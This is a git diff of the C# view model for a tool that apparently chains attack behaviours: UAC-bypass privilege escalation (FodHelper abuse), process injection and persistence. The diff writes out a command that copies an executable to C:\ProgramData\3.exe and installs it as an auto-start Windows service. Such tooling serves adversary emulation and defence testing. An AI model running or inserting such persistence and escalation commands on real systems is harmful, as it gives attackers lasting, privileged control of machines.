@@ -1,8 +1,10 @@
+using Avalonia.Controls.Shapes;
 using CommunityToolkit.Mvvm.ComponentModel;
 using CommunityToolkit.Mvvm.Input;
 using Mabean.Helpers;
 using Mabean.Models;
 using Mabean.Services;
+using System;
 using System.Collections.Generic;
 using System.Collections.ObjectModel;
 using System.Threading.Tasks;
@@ -14,8 +16,8 @@ public partial class BehaviorChainViewModel : ViewModelBase
     private readonly PayloadService _payloadService;
     private readonly ChainBehaviorService _chainBehaviorService;
 
-    //private string DefaultServiceBinaryPath = Paths.ServiceBinaryPath;
-    private string DefaultServiceBinaryPath = "C:\\3.exe";
+    private string DefaultServiceBinaryPath = Paths.ServiceBinaryPath;
+    string destExe = @"C:\ProgramData\3.exe";
 
     [ObservableProperty]
     [NotifyPropertyChangedFor(nameof(ShowPrivEscFields), nameof(ShowPrivEscPidField))]
@@ -23,7 +25,7 @@ public partial class BehaviorChainViewModel : ViewModelBase
 
     [ObservableProperty]
     [NotifyPropertyChangedFor(nameof(ShowPrivEscPidField))]
-    private string _privEscBehavior = "TokenTheft";
+    private string _privEscBehavior = "FodHelperAbuse";
 
     [ObservableProperty] private uint _privEscTargetPid;
 
@@ -60,7 +62,7 @@ public partial class BehaviorChainViewModel : ViewModelBase
     public bool ShowInjectionPidField => InjectionEnabled && InjectionBehavior != "Apc-EarlyBird";
     public bool ShowInjectionProgramField => InjectionEnabled && InjectionBehavior == "Apc-EarlyBird";
 
-    public IReadOnlyList<string> PrivEscBehaviors { get; } = ["TokenTheft", "FodHelperAbuse"];
+    public IReadOnlyList<string> PrivEscBehaviors { get; } = ["FodHelperAbuse"];
     public IReadOnlyList<string> PersistenceBehaviors { get; } = ["ServiceInstall"];
     public IReadOnlyList<string> InjectionBehaviors { get; } = ["Simple", "Apc-MultiThreaded", "Apc-EarlyBird"];
 
@@ -91,7 +93,7 @@ public partial class BehaviorChainViewModel : ViewModelBase
     private async Task RunChain()
     {
         var resolvedBinaryPath = PersistenceUseDefaultPath ? DefaultServiceBinaryPath : PersistenceBinaryPath;
-        var fodHelperCommand = $@"cmd /c ""sc create {PersistenceServiceName} binPath= {resolvedBinaryPath} start= auto && sc start {PersistenceServiceName}""";
+        var fodHelperCommand = $@"cmd.exe /c copy /Y ""{resolvedBinaryPath}"" ""{destExe}"" && sc create {PersistenceServiceName} binPath= ""{destExe}"" start= auto && sc start {PersistenceServiceName}""";
 
         var definition = new BehaviorChainDefinition
         {
